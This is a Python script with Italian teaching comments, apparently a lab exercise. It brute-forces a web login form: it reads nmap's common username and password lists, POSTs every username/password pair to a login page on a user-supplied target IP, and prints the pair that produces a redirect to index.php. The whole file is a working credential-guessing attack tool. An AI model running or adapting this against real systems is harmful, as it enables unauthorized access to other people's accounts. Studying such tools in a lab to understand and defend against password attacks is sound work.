import http.client, urllib.parse

#L'HTTP è un protocollo che lavora con un'architettura di tipo client/server: il client esegue una richiesta e il server restituisce la risposta mandata da un altro host
#Il modulo urllib.parse fornisce funzioni per manipolare gli URL e le parti con le quali sono costituiti, sia per comporli che per decomporli.

#Applichiamo dei file contenenti gli user e password più frequentemente utilizzati

username_file = open('/usr/share/nmap/nselib/data/usernames.lst') #La funzione open accetta un file in input e lo apre in lettura
password_file = open('/usr/share/nmap/nselib/data/passwords.lst') 

#Lo scopo è leggere da entrambi i file e provare tutte le combinazioni user/password

user_list = username_file.readlines() #la funzione readlines() copia il contenuto del file nella variabile user/pwd_list
pwd_list = password_file.readlines()

target = input("Inserisci IP della sistema target: ") #Qui andremo ad inserire l'IP del target
login = input("Inserisci l'url della pagina target: ") #Qui andremo ad inserire l'url della pagina da attaccare

for user in  user_list: #Utilizzeremo un ciclo for nidificato per testare tutte le combinazioni user/password
    user = user.rstrip()
    for pwd in pwd_list: #Per ogni nome utente verranno testate tutte le password
        pwd = pwd.rstrip()

        print (user,"-",pwd)

        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,"Login": 'Submit'}) #Le combinazioni user/password inserite nella variabile post_parameters vengono inviate tramite HTTP request POST alla pagina di login
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection(target,80) #Dopo aver effettuato la connessione HTTP alla coppia IP:porta con il metodo http.client.HTTPConnection
        conn.request('POST', login, post_parameters, headers)
        response = conn.getresponse()
        print(response.status)
#Si recupererà la risposta che invia il server alle credenziali immesse
        if(response.getheader('location') == "index.php"):  #se l'header della pagina è uguale all'index.php possiamo dire che le credenziali immesse sono valide, se l'header è diverso, il programma proverà la prossima coppia user/password
            print("Logged with:",user," - ",pwd)
            exit()
